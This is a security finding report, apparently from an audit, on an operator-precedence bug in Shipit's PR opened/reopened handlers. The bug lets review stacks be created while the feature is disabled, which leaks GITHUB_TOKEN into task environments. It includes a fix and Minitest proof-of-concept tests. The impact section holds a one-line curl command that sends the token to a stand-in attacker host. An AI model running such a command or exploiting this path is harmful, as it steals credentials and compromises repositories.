### Title
`OpenedHandler#provision?` / `ReopenedHandler#unarchive?` operator-precedence bug lets `review_stacks_enabled = false` be bypassed, allowing an attacker's PR to spin up a `ReviewStack` whose Task env leaks `GITHUB_TOKEN` — ([File: app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb], [File: app/models/shipit/webhooks/handlers/pull_request/reopened_handler.rb], [File: lib/shipit/commands.rb])

### Summary
`OpenedHandler#provision?` and `ReopenedHandler#unarchive?` compute `repository.review_stacks_enabled && allow_all? || (allow_with_label? && label?) || (prevent_with_label? && !label?)`. Because `&&` binds tighter than `||`, `review_stacks_enabled` only guards the `allow_all` branch — it is silently skipped for the `allow_with_label`/`prevent_with_label` branches. Once such a `ReviewStack` is (re)created for an attacker's PR, `Commands#base_env` unconditionally injects `'GITHUB_TOKEN' => github.token` into every `Task`'s environment, which flows unmodified through `Command#env` → `Command#unbundled_env` → `PTY.spawn`, letting an attacker-authored `shipit.yml` step exfiltrate it.

### Finding Description
The broken binding: the intended invariant is `stack_created_or_unarchived == repository.review_stacks_enabled` (a `ReviewStack` should never be created/unarchived for a repository whose maintainer has turned Review Stacks off). Code: [1](#0-0) 

Due to Ruby operator precedence this evaluates as `(review_stacks_enabled && allow_all?) || (allow_with_label? && has_label?) || (prevent_with_label? && !has_label?)` — `review_stacks_enabled` is not applied to the last two disjuncts. The identical pattern exists in `ReopenedHandler#unarchive?`: [2](#0-1) 

By contrast, `LabeledHandler#respond_to_label_change?` correctly ANDs `review_stacks_enabled` across the whole condition: [3](#0-2) 
confirming the `Opened`/`Reopened` handlers are outliers/bugs rather than intended behavior.

Root cause / reachable state: `provisioning_behavior` is a persisted enum independent from `review_stacks_enabled` [4](#0-3) 
so a maintainer who once enabled Review Stacks with `allow_with_label`/`prevent_with_label` and later disables the feature (unchecks "Dynamically provision stacks") while the `provisioning_behavior` select retains its previous value leaves the repository in the state `review_stacks_enabled: false, provisioning_behavior: "prevent_with_label"`. In this state, per the rules' attacker capabilities (open a PR, label their own PR), an attacker just opens (or reopens) a PR against the victim repo with no provisioning label — `provision?`/`unarchive?` returns `true` via the third disjunct, and `ReviewStackAdapter#create!`/`#unarchive!` creates/reactivates a `ReviewStack` bound to the attacker's fork branch and commit: [5](#0-4) 

Once a Task runs against that stack, `Commands#base_env` merges the org's `GITHUB_TOKEN`: [6](#0-5) 
`TaskCommands#env` inherits it via `super`: [7](#0-6) 
and each deploy step is built as `Command.new(command_line, env:, ...)`: [8](#0-7) 
`Command#env` stores it, and `#unbundled_env` merges it into the process env passed straight to `PTY.spawn`: [9](#0-8) 
Existing tests confirm `GITHUB_TOKEN` is present in `command.env` for a stack's commands: [10](#0-9) 

No existing guard catches this: `verify_signature`/webhook auth only confirms the webhook is genuinely from GitHub, not that the *content* (PR labels, action) is authorized to create a stack; `ExplicitParameters` schema only validates payload shape; `Repository` model validations do not constrain `provisioning_behavior`/`review_stacks_enabled` combinations; and the `LabeledHandler`'s correct AND-grouping is not shared by `OpenedHandler`/`ReopenedHandler`.

### Impact Explanation
An attacker who can open/reopen a pull request against a target repository — with no Shipit privileges — can force creation/unarchival of a `ReviewStack` for that repository even though an authorized maintainer explicitly disabled Review Stacks (`review_stacks_enabled: false`), provided the residual `provisioning_behavior` is `allow_with_label`/`prevent_with_label` (a realistic leftover configuration state). Once a Task executes against that stack (e.g., via automatic provisioning/CI-triggered deploy), the attacker's own `shipit.yml` steps run with `GITHUB_TOKEN` for that repository's org present in the process environment, and can exfiltrate it (`curl attacker.com?token=$GITHUB_TOKEN`). This is a Critical-severity `GITHUB_TOKEN` exfiltration matching the rubric's impact category, repeatable against any repository stuck in this state, and giving the attacker a live, repo-scoped (org-scoped, per `Shipit.github(organization: owner)`) GitHub token that can be used to push code, open PRs, or otherwise act as the Shipit GitHub App/bot for that organization.

### Likelihood Explanation
Requires a specific but plausible precondition: the target repository must have `provisioning_behavior` set to `allow_with_label` or `prevent_with_label` (set at some point by an authorized admin) while `review_stacks_enabled` is `false` (e.g., admin toggled the feature off later without resetting the behavior dropdown). Given the settings UI exposes these as independent form fields, this is a realistic misconfiguration rather than a contrived one. Attacker cost is minimal: open/reopen a PR (with or without a specific label, per the chosen behavior) — no elevated GitHub or Shipit permission needed, per the stated attacker capabilities. The exploit is fully repeatable against any repository in this state.

### Recommendation
Fix operator grouping in both handlers so `review_stacks_enabled` gates every branch:
```ruby
def provision?
  repository.review_stacks_enabled &&
    (repository.provisioning_behavior_allow_all? ||
     (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
     (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?))
end
```
Apply the same parenthesization to `ReopenedHandler#unarchive?`. Additionally, consider resetting/validating `provisioning_behavior` when `review_stacks_enabled` is turned off, to eliminate the inconsistent persisted state entirely.

### Proof of Concept
Minitest plan (no live GitHub, stub `Command#start`/`PTY.spawn`):

1. In `test/models/shipit/webhooks/handlers/pull_request/opened_handler_test.rb`, add:
```ruby
test "BUG: creates a stack even when review_stacks_enabled is false, for prevent_with_label behavior" do
  repository = shipit_repositories(:shipit)
  repository.update!(review_stacks_enabled: false, provisioning_behavior: :prevent_with_label, provisioning_label_name: "pull-requests-label")

  payload = payload_parsed(:pull_request_opened)
  payload["pull_request"]["labels"] = [] # no preventing label

  assert_difference -> { Shipit::Stack.count } do
    OpenedHandler.new(payload).process
  end
  # Demonstrates review_stacks_enabled == false diverges from stack_created == true
end
```
2. In a task-level test (e.g. `test/unit/task_commands_test.rb` or similar), stub `PTY.spawn`/`Command#start` to capture the env passed:
```ruby
test "GITHUB_TOKEN reaches unbundled_env for a Task on an illegitimately created ReviewStack" do
  # ... build review_stack with review_stacks_enabled: false, provisioning_behavior: :prevent_with_label via OpenedHandler as above
  task = stack.trigger_deploy # or equivalent Task creation
  commands = Shipit::TaskCommands.new(task)
  command = commands.perform.first

  captured_env = nil
  PTY.stubs(:spawn).with { |env, *_args, **_kwargs| captured_env = env; true }.returns([StringIO.new, StringIO.new, 1])
  command.start

  assert captured_env.key?('GITHUB_TOKEN'), "GITHUB_TOKEN leaked into unbundled_env for an unauthorized review stack"
end
```
Both sides of the equality (`repository.review_stacks_enabled == false` vs. `Shipit::Stack.count` increasing / `GITHUB_TOKEN` present in `unbundled_env`) are asserted directly, demonstrating the divergence caused by the operator-precedence bug.
